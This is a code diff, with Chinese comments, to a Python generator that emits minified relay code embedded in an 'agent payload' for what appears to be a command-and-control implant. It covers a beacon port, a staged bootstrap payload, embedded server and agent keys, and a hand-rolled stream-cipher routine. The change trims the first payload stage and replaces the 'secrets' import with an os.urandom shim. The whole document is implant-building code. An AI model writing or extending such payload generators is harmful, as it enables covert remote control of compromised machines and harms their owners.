@@ -16,8 +16,17 @@ server 端零改动（beacon 端口仍裸 TCP 帧协议）。
 
 def relay_code(server_key_hex: str, agent_key_hex: str,
                server_host: str, server_port: int, via: str,
-               long_lived: bool = False) -> str:
-    """返回公共中继代码字符串（短名 minify 风格，嵌入 agent 载荷）。"""
+               long_lived: bool = False,
+               with_agent_key: bool = True) -> str:
+    """返回公共中继代码字符串（紧凑短名风格，嵌入 agent 载荷）。
+
+    with_agent_key=False：不输出 `_AK`（agent 密钥）与 `_VIA`（通道名）两行 ——
+    分段载荷第一段（引导）只与 server 用 `_SK` 通信、且不需要给 register 打
+    via 标记，这两行是纯死重量（实测全文各只出现 1 次＝仅定义）。中继类
+    agent（a2s/s2a、relay_tx）依赖它们，必须保持默认 True。
+    """
+    if not with_agent_key and long_lived:
+        raise ValueError("with_agent_key=False 只适用于引导段(不生成中继函数)")
     extra = ""
     if long_lived:
         extra = f'''
@@ -36,13 +45,21 @@ def s2a(c,u):
    d=R(u,_SK);S(c,d,_AK)
  except:pass
 '''
+    agent_key_lines = ""
+    if with_agent_key:
+        agent_key_lines = f"_AK=bytes({agent_key_hex})\n_VIA={via!r}\n"
     return f'''\
-import socket as a,struct as b,zlib as c,json as e,threading as f,secrets as l,hashlib as h,hmac as hm
+import socket as a,struct as b,zlib as c,json as e,threading as f,os as _osx,hashlib as h,hmac as hm
+class _L:
+ token_bytes=staticmethod(_osx.urandom)
+ @staticmethod
+ def token_hex(n=32): return _osx.urandom(n).hex()
+ @staticmethod
+ def randbelow(n): return int.from_bytes(_osx.urandom(16),'big')%n
+l=_L()
 _SK=bytes({server_key_hex})
-_AK=bytes({agent_key_hex})
-_SH={server_host!r}
+{agent_key_lines}_SH={server_host!r}
 _SP={server_port}
-_VIA={via!r}
 def Q(s,x,y,z,w):
  s[x]=(s[x]+s[y])&0xffffffff
  s[w]=((s[w]^s[x])<<16|(s[w]^s[x])>>16)&0xffffffff
